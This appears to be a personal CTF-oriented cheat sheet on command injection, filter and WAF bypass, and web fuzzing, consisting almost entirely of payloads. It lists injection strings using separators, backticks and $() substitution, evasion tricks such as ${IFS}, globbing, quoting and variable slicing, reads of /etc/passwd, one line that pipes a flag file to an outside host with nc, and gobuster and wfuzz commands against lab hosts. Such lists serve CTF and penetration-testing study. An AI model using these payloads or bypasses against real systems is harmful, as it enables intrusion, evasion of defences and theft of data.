# Command Injection & WAF bypass & Fuzzing
[TOC]
###### tags: `Security` `Fuzzing`

```
& ; - ` | $
```

# Command Injection
## Cheatsheet
[GitHub - payloadbox](https://github.com/payloadbox/command-injection-payload-list)
```
| cat flag
&& cat flag
; cat flag
%0a cat flag
"; cat flag
`cat flag`
cat $(ls)
"; cat $(ls)
`cat flag | nc wildfoo.tw 7778`

. flag
PS1=$(cat flag)

`echo${IFS}${PATH}|cut${IFS}-c1-1`
=> /
```

## keywords
### Regular expression
- `?` match one character
    - `cat fl?g`
    - `/???/??t /???/p??s??`
- `*` match multiple characters
    - `cat f*`
    - `cat f?a*`

### String Concat
- `A=fl;B=ag;cat $A$B`
    
### Empty Variable
- `cat fl${x}ag`
- `cat tes$(z)t/flag`
    
### Environment Variable
use `env` to print out environment variables
- `$PATH => "/usr/local/….blablabla”`
    - `${PATH:0:1}   => '/'`
    - `${PATH:1:1}   => 'u'`
    - `${PATH:0:4}   => '/usr'`
- `${PS2}` 
    - `>`
- `${PS4}`
    - `+`
       
### String operating
- Empty String
    - `cat fl""ag`
    - `cat fl''ag`
- `cat "fl""ag"`

### Backslash
- `c\at fl\ag`
    
## \<space> characters
### `${IFS}`
- `cat${IFS}flag`
- `ls$IFS-alh`
- `cat$IFS$2flag`
### Redirecting
- `cat</etc/passwd`

#### bash
- `{cat,/etc/passwd}`
- `X=$'cat\x20/etc/passwd'&&$X`
- ``` IFS=,;`cat<<<uname,-a` ```

# WAF bypass & Fuzz
### Enum path
* `gobuster -u http://fluxcapacitor.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
### Enum option
* `wfuzz --hh BBB -H "User-Agent:alamot" -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.69/sync/?FUZZ{not_this}=test`
* `wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "User-Agent: nothingtoseehere" --hh=19 "http://fluxcapacitor.htb/sync?FUZZ=test"`
https://bitvijays.github.io/LFC-VulnerableMachines.html#parameter-fuzz
### Enum bad char
* `wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/special_chars.txt -u http://10.10.10.69/sync?opt=FUZZ`

# Example
```
opt=' pw''d'
opt=' whi''ch cu''rl'
opt=' /usr/bin/whi[c]h mk\nod'
opt=' p\s aux'
```